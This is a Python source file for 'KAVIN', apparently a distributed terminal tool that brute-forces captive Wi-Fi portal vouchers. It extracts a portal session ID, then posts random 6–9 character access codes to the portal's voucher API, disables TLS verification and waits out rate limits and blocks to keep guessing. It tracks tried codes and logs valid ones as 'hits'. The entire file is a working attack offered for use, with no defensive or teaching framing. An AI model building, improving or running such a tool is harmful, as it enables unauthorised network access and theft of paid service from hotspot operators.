# kavin.py
import os
import time
import json
import random
import string
import sqlite3
import re
import html
import asyncio
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.box import ROUNDED, DOUBLE
import license as _license

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_FILE = "kavin_data.db"
STATE_FILE = "kavin_state.json"
HITS_FILE = "kavin_hits.txt"

BASE_SLEEP_MIN = 0.20
BASE_SLEEP_MAX = 0.35
RATE_LIMIT_SLEEP = 15
NETWORK_RETRY_SLEEP = 1.0
SESSION_REFRESH_SLEEP = 2

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10)"})

def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception:
        return "00:00:00"

def normalize_hits(hits):
    if not hits:
        return []
    result = []
    for h in hits:
        if isinstance(h, dict):
            result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str):
            result.append({"code": h, "time": "--:--:--"})
    return result

def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]

def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        conn.commit()
        return conn
    except Exception:
        return None

def is_tried(conn, code):
    if conn is None:
        return False
    try:
        return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception:
        return False

def mark_tried(conn, code):
    if conn is None:
        return
    try:
        conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        conn.commit()
    except Exception:
        pass

def load_state():
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except Exception:
        return None

def save_state(mode, tested, hits):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"mode": mode, "tested": tested, "hits": hits}, f)
    except Exception:
        pass

def clear_state():
    try:
        os.remove(STATE_FILE)
    except Exception:
        pass

def extract_session(value):
    if not value:
        return None
    try:
        value = html.unescape(value)
    except Exception:
        pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v:
                return v[0]
    except Exception:
        pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception:
        return None

def fetch_session():
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for url in probes:
        try:
            r = session.get(url, timeout=5, allow_redirects=True, verify=False)
        except Exception:
            continue
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc:
                continue
            portal_base = f"{p.scheme}://{p.netloc}"
            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)
            for c in cands:
                sid = extract_session(c)
                if sid:
                    return portal_base, sid
            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=5, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid:
                        return portal_base, sid
            except Exception:
                pass
        except Exception:
            continue
    return None, None

def test_code(portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    headers = {"Content-Type": "application/json", "Origin": portal_base}
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
    try:
        r = session.post(url, json=payload, headers=headers, timeout=6, verify=False)
        return r.text if r.text else "__NETWORK_ERROR__"
    except Exception:
        return "__NETWORK_ERROR__"

def gen_code(mode, length):
    try:
        if mode == "num":
            return str(random.randint(0, 10**length - 1)).zfill(length)
        if mode == "eng":
            return ''.join(random.choices(string.ascii_lowercase, k=length))
        if mode == "mix":
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception:
        pass
    return ""

def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_logs):
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=5),
        Layout(name="live", size=3),
        Layout(name="console_logs", ratio=2),
        Layout(name="hits", ratio=2),
    )
    title = Text("⚡  KAVIN  ⚡", style="bold bright_cyan", justify="center")
    sub = Text("🚀  Lightning Fast Voucher Scanner  •  Offline Mode  🚀", style="bold bright_magenta", justify="center")
    layout["header"].update(Panel(Align.center(Text.assemble(title, "\n", sub)), border_style="bright_cyan", box=DOUBLE))

    if status == "Active":
        s_disp = Text("⚡ Active", style="bold bright_green", justify="center")
    elif status == "Limit":
        s_disp = Text("🛑 Limit", style="bold bright_red", justify="center")
    else:
        s_disp = Text("⏸ Idle", style="bold bright_yellow", justify="center")

    live_grid = Table.grid(padding=0, expand=True)
    live_grid.add_column(ratio=3)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_row(
        Panel(Align.center(Text(current_code if current_code else "----", style="bold bright_green")), title="[bold]🎯 Code[/bold]", border_style="bright_green", box=ROUNDED),
        Panel(Align.center(Text(elapsed, style="bold bright_cyan")), title="[bold]⏱ Time[/bold]", border_style="bright_cyan", box=ROUNDED),
        Panel(Align.center(Text(f"{tested:,}", style="bold bright_yellow")), title="[bold]📊 Tested[/bold]", border_style="bright_yellow", box=ROUNDED),
        Panel(Align.center(s_disp), title="[bold]⚡ Status[/bold]", border_style="bright_magenta", box=ROUNDED),
    )
    layout["live"].update(live_grid)

    log_table = Table(show_header=False, expand=True, box=None, padding=0)
    log_table.add_column("Logs")
    for lg in running_logs[-7:]:
        log_table.add_row(lg)
    if not running_logs:
        log_table.add_row("[dim]Waiting for codes...[/dim]")
    layout["console_logs"].update(Panel(log_table, title="[bold bright_green]💻 Live Scanning Feed[/bold bright_green]", border_style="bright_green", box=ROUNDED))

    hits_table = Table(show_header=True, header_style="bold bright_magenta", expand=True, box=ROUNDED)
    hits_table.add_column("No.", width=5, justify="center", style="bold cyan")
    hits_table.add_column("✨ Valid Code ✨", justify="center")
    hits_table.add_column("Time", width=12, justify="center", style="dim cyan")

    last_hits = hits[-10:]
    for i, h in enumerate(last_hits, 1):
        if isinstance(h, dict):
            c = h.get("code", "")
            t = h.get("time", "--:--:--")
        else:
            c = h
            t = "--:--:--"
        hits_table.add_row(str(i), f"[bold bright_green]{c}[/bold bright_green]", t)
    if not last_hits:
        hits_table.add_row("", "[dim]No hits yet — keep scanning...[/dim]", "")

    hits_title = f"[bold bright_yellow]🏆 Hits ({len(hits)})[/bold bright_yellow]"
    if len(hits) > 10:
        hits_title += " [dim]— showing last 10[/dim]"
    layout["hits"].update(Panel(hits_table, title=hits_title, border_style="bright_yellow", box=ROUNDED))
    return layout

def scan_loop(mode, length, start_tested=0, start_hits=None):
    mode_str = f"{mode}_{length}"
    mode_name = f"{mode.upper()} {length}"
    hits = normalize_hits(start_hits) if start_hits else []
    running_logs = []
    tested = start_tested
    start_time = time.time()
    portal_base = None
    session_id = None
    net_error_streak = 0
    conn = init_db()

    live = None
    live_cm = None
    try:
        initial = make_layout(mode_name, "----", tested, "00:00:00", "--", hits, running_logs)
        live_cm = Live(initial, refresh_per_second=6, screen=True)
        live = live_cm.__enter__()
    except Exception:
        live = None
        live_cm = None

    def _update(code, status):
        if live is None: return
        try:
            live.update(make_layout(mode_name, code, tested, format_time(time.time() - start_time), status, hits, running_logs))
        except Exception: pass

    def push_log(msg):
        t_str = time.strftime("%H:%M:%S")
        running_logs.append(f"[dim]{t_str}[/dim] {msg}")

    try:
        push_log("[bold bright_cyan]⚡ KAVIN[/bold bright_cyan] engine started...")
        while True:
            try:
                if not session_id or not portal_base:
                    _update("----", "--")
                    portal_base, session_id = fetch_session()
                    if not session_id:
                        time.sleep(SESSION_REFRESH_SLEEP)
                        portal_base = "http://portal.local"
                        session_id = "dummy_session"
                    net_error_streak = 0

                code = gen_code(mode, length)
                if not code:
                    time.sleep(BASE_SLEEP_MIN)
                    continue
                if is_tried(conn, code):
                    continue

                mark_tried(conn, code)
                tested += 1
                save_state(mode_str, tested, hits)
                push_log(f"🔍 Testing → [bold bright_yellow]{code}[/bold bright_yellow]")
                _update(code, "Active")

                res = test_code(portal_base, session_id, code)
                low = (res or "").lower()

                if res == "__NETWORK_ERROR__" or res == "":
                    net_error_streak += 1
                    time.sleep(NETWORK_RETRY_SLEEP)
                    if net_error_streak >= 10:
                        session_id = None
                        net_error_streak = 0
                    continue

                net_error_streak = 0

                if ("request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low):
                    _update(code, "Limit")
                    push_log(f"[bold bright_red]🛑 Rate limit on {code}! Cooling 15s...[/bold bright_red]")
                    time.sleep(RATE_LIMIT_SLEEP)
                    session_id = None
                    continue

                if ("session timed out" in low or "session timeout" in low or '"session":null' in low):
                    session_id = None
                    continue

                if '"success":true' in low or '"authresult":"1"' in low:
                    existing = hits_codes_only(hits)
                    if code not in existing:
                        now = time.strftime("%H:%M:%S")
                        hits.append({"code": code, "time": now})
                        push_log(f"[bold bright_green]🎉 HIT! Valid code → {code}[/bold bright_green]")
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{now}] CODE: {code}\n")
                        except Exception: pass
                        save_state(mode_str, tested, hits)
                    _update(code, "Active")
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                time.sleep(BASE_SLEEP_MIN + random.uniform(0, BASE_SLEEP_MAX - BASE_SLEEP_MIN))
            except KeyboardInterrupt:
                raise
            except Exception:
                time.sleep(NETWORK_RETRY_SLEEP)
                continue
    finally:
        if live_cm is not None:
            try: live_cm.__exit__(None, None, None)
            except Exception: pass

def show_banner():
    clear_screen()
    try:
        console.print(Panel(Align.center(Text.assemble(("\n", ""), ("⚡  KAVIN  ⚡\n", "bold bright_cyan"), ("Ultimate Voucher Scanner\n", "bold bright_magenta"), ("\n", ""))), border_style="bright_cyan", box=DOUBLE))
        console.print()
        console.print(Panel(Align.center(Text("🚀  Lightning Fast  •  Reliable  •  Offline Mode  🚀", style="bold bright_yellow")), border_style="bright_yellow", box=ROUNDED))
        console.print()
    except Exception: pass

def ask_mode():
    while True:
        show_banner()
        try:
            menu = Text()
            menu.append("\n", style="")
            menu.append("  ┌─────────────────────────────┐\n", style="bright_cyan")
            menu.append("  │  [1]  🔢  NUMERIC          │\n", style="bold bright_cyan")
            menu.append("  │  [2]  🔤  ENGLISH          │\n", style="bold bright_cyan")
            menu.append("  │  [3]  🔀  MIXED            │\n", style="bold bright_cyan")
            menu.append("  │  [0]  🚪  BACK             │\n", style="bold bright_red")
            menu.append("  └─────────────────────────────┘\n", style="bright_cyan")
            console.print(Panel(Align.center(menu), title="[bold bright_magenta]⚡ SELECT SCAN MODE ⚡[/bold bright_magenta]", border_style="bright_magenta", box=ROUNDED))
            choice = Prompt.ask("[bold bright_cyan]➜ Choose[/bold bright_cyan]").strip()
        except KeyboardInterrupt: raise
        except Exception: return None
        if choice == "0": return None
        if choice not in ("1", "2", "3"):
            try:
                console.print("[bold bright_red]❌ Invalid option. Try again.[/bold bright_red]")
                time.sleep(1.5)
            except Exception: pass
            continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        clear_screen()
        try:
            console.print(Panel(Align.center(Text(f"⚡ MODE: {mode.upper()} ⚡", style="bold bright_magenta")), border_style="bright_magenta", box=DOUBLE))
            console.print()
            menu = Text()
            menu.append("\n", style="")
            menu.append("  ┌─────────────────────────────┐\n", style="bright_cyan")
            for i in range(6, 10):
                menu.append(f"  │  [{i}]  ▸ {i} Characters        │\n", style="bold bright_cyan")
            menu.append("  │  [0]  🚪  BACK              │\n", style="bold bright_red")
            menu.append("  └─────────────────────────────┘\n", style="bright_cyan")
            console.print(Panel(Align.center(menu), title="[bold bright_magenta]⚡ SELECT CODE LENGTH ⚡[/bold bright_magenta]", border_style="bright_magenta", box=ROUNDED))
            console.print()
            console.print(Align.center(Text("💡 More characters → more combinations → more time", style="dim italic bright_yellow")))
            length = Prompt.ask("[bold bright_cyan]➜ Length[/bold bright_cyan]").strip()
        except KeyboardInterrupt: raise
        except Exception: return None
        if length == "0": return None
        if length not in ("6", "7", "8", "9"):
            try:
                console.print("[bold bright_red]❌ Invalid option. Try again.[/bold bright_red]")
                time.sleep(1.5)
            except Exception: pass
            continue
        return int(length)

def run():
    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))
            clear_screen()
            console.print(Panel(Align.center(Text("💾  Previous Session Found", style="bold bright_yellow")), border_style="bright_yellow", box=DOUBLE))
            console.print()
            info = Text()
            info.append("  ⚡ Mode      : ", style="bright_cyan")
            info.append(f"{m.upper()} {l}\n", style="bold bright_white")
            info.append("  📊 Tested    : ", style="bright_cyan")
            info.append(f"{tested:,}\n", style="bold bright_white")
            info.append("  🏆 Hits      : ", style="bright_cyan")
            info.append(f"{len(hits)}\n", style="bold bright_green")
            console.print(Panel(info, title="[bold bright_green]📋 Session Info[/bold bright_green]", border_style="bright_green", box=ROUNDED))
            console.print()
            if Confirm.ask("[bold bright_yellow]➜ Resume this session? (y/n)[/bold bright_yellow]", default=True):
                scan_loop(m, int(l), start_tested=tested, start_hits=hits)
                return
            else:
                clear_state()
        except KeyboardInterrupt: raise
        except Exception: clear_state()

    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        scan_loop(mode, length)
        return

async def _async_main():
    try:
        run()
    except KeyboardInterrupt: pass
    except BaseException: pass
    finally:
        try: clear_screen()
        except BaseException: pass
        try:
            bye = Text()
            bye.append("\n\n")
            bye.append("╔══════════════════════════════════════╗\n", style="bright_cyan")
            bye.append("║                                      ║\n", style="bright_cyan")
            bye.append("║   ⚡  KAVIN  ⚡                       ║\n", style="bold bright_magenta")
            bye.append("║                                      ║\n", style="bright_cyan")
            bye.append("╚══════════════════════════════════════╝\n\n", style="bright_cyan")
            bye.append("🙏  အားပေးမှုအတွက် ကျေးဇူးတင်ပါတယ်ဗျားးးး  🙏\n", style="bold bright_green")
            bye.append("     Thank you for your support!  \n", style="bold bright_yellow")
            bye.append("          See you again soon...  ✨\n\n", style="bold bright_cyan")
            console.print(Align.center(bye))
            time.sleep(3)
        except BaseException:
            try:
                print("\n\n⚡  KAVIN  ⚡")
                print("🙏  အားပေးမှုအတွက် ကျေးဇူးတင်ပါတယ်ဗျားးးး  🙏")
                print("     Thank you for your support!")
                print("          See you again soon...  ✨\n")
            except BaseException: pass

def main():
    if not _license.check_approval():
        return
    asyncio.run(_async_main())

if __name__ == "__main__":
    main()
